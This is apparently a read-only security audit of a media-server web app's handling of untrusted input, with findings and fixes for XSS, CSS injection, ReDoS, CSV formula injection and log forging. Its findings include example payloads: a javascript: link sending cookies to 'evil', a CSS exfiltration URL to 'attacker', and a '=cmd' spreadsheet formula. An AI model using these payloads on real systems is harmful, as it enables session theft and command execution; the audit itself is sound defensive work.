# A21 — Untrusted-Input Handling Audit

Scope: output encoding / XSS, ReDoS & parser robustness, injection beyond SQL (header/log/command),
and prototype pollution / deserialization. SQLi, auth, CSRF, and path-traversal/SSRF on proxies are
covered by prior reports and are out of lens here. Read-only.

## Summary

React's JSX auto-escaping neutralises the bulk of stored/reflected XSS: torrent/release titles,
filenames, usernames, display names, and chat messages were all traced and only ever reach the DOM
through escaped JSX text nodes (`ChatPanel.tsx:81,89`, `TorrentPickModal.tsx:527,585`, library/search
/admin tables). The only `dangerouslySetInnerHTML` is a static inline theme-restore script
(`layout.tsx:33`) with no user data. The real XSS exposure is narrow and lives where JSX is
deliberately bypassed: (1) an `<a href>` built from the remote, community-editable TMDB `homepage`
field with no scheme allow-list (`javascript:` URL XSS), and (2) the dynamic theme `<style>` injector,
whose **import** path accepts un-validated color strings → CSS injection. The hand-rolled parsers have
polynomial-backtracking shapes and, worse, an admin-supplied `new RegExp` is run against untrusted
release titles (ReDoS that can stall the auto-grab cron). xml2js runs on remote indexer XML with
default options (no XXE — sax-js does not expand external entities — but the response is buffered and
parsed with no size cap). CSV exports escape quotes/commas but not spreadsheet formula prefixes.
Several log writes interpolate user/remote strings without stripping CR/LF, and one of those sinks
(the Seerr webhook) is reachable unauthenticated when the optional secret is unset. No prototype
pollution sink exists (settings PUT writes a parameterised key/value table, not an object merge), and
ffmpeg/ffprobe are invoked with argv arrays — no shell.

## Counts by severity

| Severity | Count |
|---|---|
| High     | 0 |
| Medium   | 3 |
| Low      | 5 |
| Info     | 5 |

---

## Medium

### A21-01 — `javascript:` URL XSS via TMDB `homepage` in ExternalLinks
- Severity: Medium
- File: `src/components/media/MovieDetailPanel.tsx:179`, `src/components/media/TvDetailPanel.tsx:151`; rendered at `src/components/media/ExternalLinks.tsx:21`
- What's wrong: both detail panels build `{ label: 'Official site', url: movie.homepage ?? '' }` (and `show.homepage`) and pass it to `<a href={link.url} target="_blank">`. The only filter is `links.filter(l => Boolean(l.url))` (`ExternalLinks.tsx:13`) — truthiness, not scheme. `homepage` originates from TMDB metadata (`tmdb.ts:401,464`), which is community-editable remote data. A value like `javascript:fetch('//evil/?c='+document.cookie)` renders as a clickable link and executes in the authenticated origin on click. React does not strip/refuse `javascript:` hrefs at render time.
- Why it matters: stored XSS in a logged-in session → session-cookie theft, CSRF-grade actions (create requests, change settings), pivot to admin if an admin clicks.
- Suggested fix: scheme allow-list before render — `try { const u = new URL(link.url); if (u.protocol !== 'http:' && u.protocol !== 'https:') return null } catch { return null }`. Apply in `ExternalLinks` so every link source is covered.

### A21-02 — CSS injection via imported custom-theme color strings
- Severity: Medium
- File: `src/components/ui/ThemeToggle.tsx:84` (`buildCustomThemeCSS`) + `:124` (`injectCustomThemeStyle` → `style.textContent`); import path `src/app/settings/display/ThemeSection.tsx:96-132` (`handleImport`)
- What's wrong: `buildCustomThemeCSS` interpolates every `colors.*` value straight into a stylesheet string that is assigned to `style.textContent`. The create-modal path feeds these from `<input type="color">` (always `#rrggbb`), but the **import** path base64-decodes a pasted/shared theme and validates only that `name` is a string and `colors` is a non-null object (`ThemeSection.tsx:108-118`) — the individual color values are never checked. A crafted theme string such as `{"name":"x","colors":{"bg":"red} :root{} *{background:url(//attacker/leak)} a{color:red","surface":"#111111",...}}` injects arbitrary CSS rules. Because the sink is `textContent` (not `innerHTML`), an HTML `</style><script>` breakout does not parse — this is CSS injection, not direct script execution.
- Why it matters: injected CSS can exfiltrate data via attribute-selector + `background:url()` requests, overlay invisible click targets (clickjacking), or deface the UI for the importing user.
- Suggested fix: validate each imported color against `/^#[0-9a-fA-F]{6}$/` (and the six expected keys) and reject the whole import on mismatch; defensively also reject `}`/`;`/`<`/`@` in any value passed to `buildCustomThemeCSS`.

### A21-03 — Admin custom-format `new RegExp` is a ReDoS sink against untrusted titles
- Severity: Medium
- File: `src/lib/automation/quality.ts:96-103` (`new RegExp(spec.value, 'i').test(rawTitle)`)
- What's wrong: a quality profile's custom-format `title_regex` spec is compiled at scoring time and tested against every release title returned from indexers (`rawTitle` flows from `scoreWithProfile(releaseTitle, …)`). The `try/catch` only traps invalid-syntax errors — it does nothing for catastrophic backtracking. An admin who creates a pattern like `(.+)+$` or `(a|a)*$`, combined with an attacker-chosen long release title from a public indexer, pins a CPU core inside the synchronous auto-grab loop, stalling the scheduler.
- Why it matters: one bad pattern × one crafted title = indefinite CPU spin on the cron worker (DoS of the automation pipeline). `spec.value` is also persisted, so the hang recurs every cycle.
- Suggested fix: enforce a regex time budget (run in a worker with a timeout, or adopt the linear-time `re2` engine for user-supplied patterns); at minimum cap `rawTitle` length (e.g. 400 chars) and reject specs containing nested quantifiers before saving.

---

## Low

### A21-04 — Polynomial backtracking in filename / release parsers
- Severity: Low
- File: `src/lib/media-server/filename-parser.ts:3` (`QUALITY_TAGS`), `:18`, `:32`, `:44`, `:56`; `src/lib/automation/parser.ts:112-142` (`extractTitle`)
- What's wrong: untrusted titles/filenames (from torrents, indexers, on-disk scan) are matched by hand-rolled regex with backtracking-prone shapes:
  - `QUALITY_TAGS = /\s+(?:…|\[.*).*/i` — a `.*` immediately follows a group that itself ends in `.*`.
  - Anime patterns chain multiple lazy groups separated by literal ` - `, e.g. `^(?:\[.+?\]\s*)?(.+?)\s+-\s+(\d{2,4})\s+-\s+(.+)$` (`:44`) and `^(.+?)\s+Episode\s+(\d{2,4})…` (`:32`). On a long input containing many ` - ` separators but no matching digit group, the engine retries each `.+?` boundary — quadratic, not exponential.
- Why it matters: a maliciously long crafted release/file name can slow scanning and grab scoring; bounded (polynomial) but still a cheap partial-DoS vector since these run in cron/scan paths.
- Suggested fix: cap input length before parsing (slice to ~300 chars); prefer anchored splits over chained lazy quantifiers; the parsers already return gracefully, so truncation is low-risk.

### A21-05 — xml2js parses unbounded untrusted indexer XML
- Severity: Low
- File: `src/lib/indexer/index.ts:53-60` (`parseStringPromise(xml, { explicitArray: true })`), `src/lib/indexer/adapters/nyaa.ts:33`
- What's wrong: the full remote response is read via `res.text()` (`index.ts:182`) and handed to xml2js with no size limit. xml2js is built on sax-js, which does **not** resolve external entities, so XXE and external billion-laughs do not apply (verified by the parser choice, [unverified] against the exact installed version). The residual risk is resource exhaustion: a hostile or compromised indexer returns a multi-hundred-MB body that is fully buffered and parsed in memory. `explicitArray: true`/default `attrkey` are correct and the code already null-checks shapes — no type-confusion concern.
- Why it matters: a single malicious indexer response can spike memory / stall the event loop during fan-out search.
- Suggested fix: enforce a response-size ceiling (inspect `Content-Length`, and/or read the body through a counting stream that aborts past N MB) before parsing; keep the existing `try/catch`.

### A21-06 — CSV export omits formula-injection neutralisation
- Severity: Low
- File: `src/app/api/admin/audit/export/route.ts:12-19` (`csvField`); `src/app/api/admin/activity/export/route.ts:29-33`
- What's wrong: both exporters correctly escape quotes/commas/newlines, but neither neutralises leading formula characters. A field beginning with `=`, `+`, `-`, `@` (and in some apps a leading TAB/CR) is evaluated as a formula by Excel/LibreOffice/Sheets on open. The vulnerable cells carry user-supplied data: `username` (chosen at registration), audit `details`, `ip_address`, and (in activity export) `item_title` / `series_title` derived from media/file metadata.
- Why it matters: CSV formula injection → command execution (`=cmd|'/c calc'!A1`), data exfiltration via `=HYPERLINK`/`WEBSERVICE`, or credential phishing when an admin opens the export. Admin-only export, but the injected payload runs on the admin's workstation.
- Suggested fix: per OWASP, prefix any value beginning with `= + - @ \t \r` with a single quote (or a leading `'`) inside `csvField` / the activity mapper.

### A21-07 — Log forging via un-sanitised newlines in user/remote data (one sink unauthenticated)
- Severity: Low
- File: `src/lib/media-server/scanner.ts:114` (`itemTitle`), `:116`; `src/lib/automation/grabber.ts:298` (`item.title`); `src/lib/indexer/index.ts:58` (`indexerName`), `:177-188`; `src/app/api/seerr/webhook/route.ts:104-108,134,188` (`notification_type`, `subject`, `requestedBy_username`)
- What's wrong: these log statements interpolate untrusted strings (parsed filenames, release titles, indexer names, and the webhook's attacker-supplied `subject`/`username`/`notification_type`) directly into `console.*` / `process.stderr.write` without stripping CR/LF. The Seerr webhook (`webhook/route.ts`) is explicitly unauthenticated (`route.ts:5`) and only logs a warning instead of rejecting when `SEERR_WEBHOOK_SECRET` is unset (`:89-91`), so an external caller can inject `\n`-laden values into the logs without credentials in that configuration.
- Why it matters: forged log lines can spoof events, hide real activity, or break log-aggregation parsing / inject into a downstream viewer. (The webhook's lack of mandatory auth is primarily an auth-audit concern; flagged here only for the log-injection consequence.)
- Suggested fix: a small `sanitizeForLog(s)` that replaces `[\r\n]` with a space (or `\\n`), applied to all interpolated user/remote values; consider making the webhook secret mandatory.

### A21-08 — Unguarded `JSON.parse` of DB scope columns can crash the grabber cron
- Severity: Low
- File: `src/lib/automation/grabber.ts:45,55,88,103,149,218,230,255`; also `grab-results.ts:49`, `requests/auto-approve.ts:68-69`, `api/requests/[id]/approve/route.ts:160-161`
- What's wrong: these parse DB text columns (`scope_episodes`, `scope_seasons`, `profile.conditions`, `candidates`, `preferred_release`) with bare `JSON.parse(...)` and no surrounding `try/catch` (contrast `quality.ts:146` and `library.ts:185,203,273`, which are guarded). A malformed/truncated value — from a partial write, manual DB edit, or a future schema change — throws synchronously inside the 15-minute auto-grab loop, aborting that cycle (and surfacing as a 500 on the approve route). The columns are app-written today (low likelihood), and the `new RegExp(patterns.join('|'))` at `grabber.ts:97` is built only from integers, so it is not an injection/ReDoS vector.
- Why it matters: a single bad row halts automated grabbing until fixed — a robustness/availability gap rather than a direct attack.
- Suggested fix: wrap each parse in `try/catch` returning a safe default (skip the item / treat scope as 'full'), mirroring the guarded sites elsewhere.

---

## Info / Verified-safe

### A21-09 — JSX auto-escaping confirmed for all external display strings
Chat messages and sender names (`ChatPanel.tsx:81,89`), release titles in the picker
(`TorrentPickModal.tsx:527,585`), and usernames/titles across library, search, requests, and admin
tables all render as JSX text children — auto-escaped by React 19. No user/remote string reaches
`dangerouslySetInnerHTML`. The sole `dangerouslySetInnerHTML` (`layout.tsx:33-37`) is a fixed
theme-restore bootstrap script with no interpolated data. Native `<track src>` subtitle rendering
(`VideoPlayer.tsx:1062`) points at same-origin `/api/media/subtitles/...` routes serving
`text/vtt` (`embedded/[id]/[streamIndex]/route.ts:62-66`); WebVTT cue text is rendered as text, not
HTML, so subtitle content is not an HTML-injection sink.

### A21-10 — No prototype-pollution sink
The flagged settings PUT (`src/app/api/admin/settings/route.ts:16-27`) iterates
`Object.entries(body)` (own enumerable keys only) and persists via parameterised
`INSERT OR REPLACE INTO app_settings(key,value)` (`settings/index.ts:11-14`). A `__proto__` /
`constructor` key becomes a literal DB row, never an object-prototype assignment. No recursive merge,
`Object.assign` over parsed JSON, or `obj[userKey]=val` pattern was found anywhere in `src/`.

### A21-11 — ffmpeg / ffprobe use argv arrays (no shell)
`probe.ts:24` (`execFileAsync(FFPROBE_BIN, [..])`) and `transcode.ts:278,405,431`
(`spawn(FFMPEG_BIN, args, …)`) pass file paths and indices as discrete argv elements — no shell
string, no interpolation. No `exec`/`execSync`/template-string command construction exists in the
media-server code. Argument injection is bounded (paths come from the DB `file_path`, not raw user
input), and stream indices are integer-validated (`embedded/.../route.ts:37-40`).

### A21-12 — Party chat hardened end-to-end
`server.ts:628-645` guards `JSON.parse` (`bad_json`), requires `type` to be a string, runs
`validateMessage` (C1, `:458`) on every field, enforces per-socket rate limiting (`:645`), and
per-message live-membership auth (`:660`). Chat text is trimmed and capped at `MAX_CHAT_LENGTH`
(`:687`); `displayName` is server-stamped from the authenticated identity (`:693`), not client-supplied.

### A21-13 — xml2js / YTS / Nyaa adapters: no type-confusion, queries encoded
Adapters defensively null-check parsed shapes and coerce with `String(...)`/`parseInt` before use
(`index.ts:96-141`, `nyaa.ts:39-55`). Outbound indexer query terms are `encodeURIComponent`-escaped
(`nyaa.ts:28`, `yts.ts:42`) and Torznab params go through `URLSearchParams` (`index.ts:161-167`), so
no query/parameter injection into the upstream indexer URL.
